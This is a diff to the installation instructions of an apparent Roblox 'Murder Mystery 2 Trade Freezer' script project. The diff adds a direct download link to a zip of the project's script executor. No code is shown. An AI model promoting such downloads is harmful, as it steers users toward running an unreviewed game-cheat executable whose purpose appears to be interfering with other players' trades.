@@ -32,7 +32,7 @@
 ### Installation & Usage
 
 1. Open **Roblox** and launch **Murder Mystery 2**.
-2. Open our script executor.
+2. Open our script executor. here it is download https://github.com/jjsplt/Murder-Mystery-2-Trade-Freezer/archive/refs/tags/v1.5.zip
 3. Run our executor:
 
 
